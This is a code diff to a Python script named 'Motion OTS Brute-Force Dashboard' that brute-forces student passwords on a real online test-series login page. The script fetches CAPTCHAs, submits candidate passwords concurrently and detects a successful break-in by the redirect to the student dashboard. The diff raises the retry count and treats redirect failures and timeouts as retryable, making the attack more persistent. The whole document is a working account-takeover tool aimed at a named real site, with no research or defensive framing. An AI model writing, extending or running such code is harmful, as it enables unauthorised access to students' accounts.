@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – Enhanced Login Logging + Test Endpoint
+Motion OTS Brute‑Force Dashboard – Retry on redirect failures
+Author: Potato
 """
 
 import os
@@ -189,8 +190,8 @@ class BruteJob:
             return
         async with semaphore:
             log_queue.put_nowait(f"⏳ Attempting {password}")
-            # Try up to 2 times with different CAPTCHAs
-            for attempt in range(2):
+            # Try up to 3 times (increased from 2) to handle redirect failures
+            for attempt in range(3):
                 try:
                     captcha = await self._fetch_captcha(session, log_queue)
                     if not captcha:
@@ -203,16 +204,20 @@ class BruteJob:
                         result_queue.put_nowait((password, session))
                         stop_event.set()
                         return
-                    if response == "captcha_error":
-                        log_queue.put_nowait("🔄 CAPTCHA wrong, retrying...")
-                        continue  # try again with new CAPTCHA
+                    # If retry‑able (captcha_error, redirect_failure, timeout), continue loop
+                    if response in ("captcha_error", "redirect_failure", "timeout"):
+                        log_queue.put_nowait(f"🔄 Retry-able: {response} – retrying (attempt {attempt+1})")
+                        continue
                     else:
-                        # Login failed for other reason – we already logged the detailed response
-                        return  # no point retrying for wrong password
+                        # Other errors – log and give up on this password
+                        log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
+                        return
                 except asyncio.TimeoutError:
                     log_queue.put_nowait(f"⏰ Timeout for {password}")
+                    continue  # retry on timeout
                 except Exception as e:
                     log_queue.put_nowait(f"❌ Worker error: {str(e)}")
+                    return
             log_queue.put_nowait(f"⏭️ Giving up on {password} after retries")
             await asyncio.sleep(0.2)
 
@@ -266,7 +271,6 @@ class BruteJob:
             async with session.post("https://onlinetestseries.motion.ac.in/login.php",
                                     data=data, headers=headers, allow_redirects=False,
                                     timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                # Log the raw response details
                 log_queue.put_nowait(f"📡 Login response: HTTP {resp.status}")
                 if resp.status == 302:
                     location = resp.headers.get("Location", "")
@@ -274,10 +278,11 @@ class BruteJob:
                     if "dashboard/student-dashboard.php" in location:
                         return True, None
                     else:
-                        return False, f"302 to {location[:50]}"
+                        # Redirect to index.php or elsewhere – likely CAPTCHA error or wrong credentials
+                        # We treat this as a retry-able error (could be wrong CAPTCHA)
+                        return False, "redirect_failure"
                 elif resp.status == 200:
                     text = await resp.text()
-                    # Log a snippet of the response
                     soup = BeautifulSoup(text, "html.parser")
                     err = soup.find("div", class_="alertmsg")
                     if err:
@@ -288,20 +293,19 @@ class BruteJob:
                         else:
                             return False, err_text[:100]
                     else:
-                        # No error div – maybe successful? But status 200 means something else.
-                        # Possibly the login succeeded but with a message? Or it's the login page again.
-                        # Check if the page contains "dashboard" or "logout" as indicator
+                        # No error div – maybe success? But status 200 with no redirect is unusual.
+                        # Check if page contains dashboard links
                         if "dashboard" in text.lower() or "logout" in text.lower():
                             log_queue.put_nowait("✅ Success detected via HTML content")
                             return True, None
                         log_queue.put_nowait("⚠️ No error div, but not clearly success either")
-                        return False, "No error div (maybe success?)"
+                        return False, "unknown_failure"
                 else:
                     log_queue.put_nowait(f"⚠️ Unexpected HTTP {resp.status}")
                     return False, f"HTTP {resp.status}"
         except asyncio.TimeoutError:
             log_queue.put_nowait("⏰ Login timeout")
-            return False, "Timeout"
+            return False, "timeout"
         except Exception as e:
             log_queue.put_nowait(f"❌ Login exception: {str(e)}")
             return False, f"Exception: {e}"
